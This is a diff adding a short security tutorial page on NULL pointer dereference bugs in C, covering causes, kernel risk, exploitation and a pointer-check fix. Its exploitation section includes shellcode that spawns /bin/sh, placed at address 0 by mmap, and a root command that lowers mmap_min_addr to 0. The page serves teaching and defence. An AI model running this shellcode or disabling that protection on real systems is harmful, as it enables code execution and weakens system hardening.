@@ -1,0 +1,54 @@
+<h1>NULL Pointer Dereference</h1>
+
+<h2>When does it appear ?</h2>
+<pre><code class="language-c">int *p = NULL;
+int a = *p; // This is a NULL Pointer Dereference
+</code></pre>
+<p>This may be address 0x00000000 but also any other implementation-defined value :</p>
+<pre><code class="language-c">int *p; // Uninitialized pointer
+int a = *p; // This is a "NULL" Pointer Dereference
+</code></pre>
+<p>Or more complicated (with a function) :</p>
+<pre><code class="language-c">void (*null_pointer_dereference)(void) = NULL;
+(*null_pointer_dereference)();
+</code></pre>
+
+<h2>What's the risk ?</h2>
+<p>In userland, it should result in a "segmentation fault" or "access violation". However, the kernel can access any address, in that case it can lead to code execution.</p>
+
+<h2>How does the exploitation work ?</h2>
+<p>The exploit will consist of allocating and injecting our shellcode to the pointed address, usually NULL so 0x00000000.</p>
+<p style="text-decoration:underline;">Example :</p>
+<pre><code class="language-c">#include &#60;stdio.h&#62;
+#include &#60;stdlib.h&#62;
+#include &#60;string.h&#62;
+#include &#60;sys/mman.h&#62;
+
+// Shellcode that open a shell
+const char shellcode[] = "\x48\xB8\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xE8\x08\x50\x48\x89\xE7\x48\x31\xC0\xB0\x3B\x48\x31\xF6\x48\x31\xD2\x0F\x05";
+
+int main() {
+	/* Inject the shellcode to the address 0x00000000 */
+	void *mem = mmap(0, sizeof(shellcode), PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
+	memcpy(mem, shellcode, sizeof(shellcode));
+
+	/* Create a pointer that point to NULL (= 0x00000000) to execute the function we injected */
+	void (*null_pointer_dereference)(void) = NULL;
+	(*null_pointer_dereference)();
+
+	return 0;
+}
+</code></pre>
+<p>For this example, mmap_min_addr needs to be set to 0 :</p>
+<pre><code class="language-bash"># echo 0 > /proc/sys/vm/mmap_min_addr</code></pre>
+<p>More documentation there :</p>
+<ul>
+	<li><a target="_blank" href="https://rootkits.xyz/blog/2018/01/kernel-null-pointer-dereference/">rootkits.xyz</a></li>
+</ul>
+
+<h2>How to patch it ?</h2>
+<p>Check the validity of the pointer :</p>
+<pre><code class="language-c">void (*null_pointer_dereference)(void) = NULL;
+if (null_pointer_dereference != NULL)
+	(*null_pointer_dereference)();
+</code></pre>
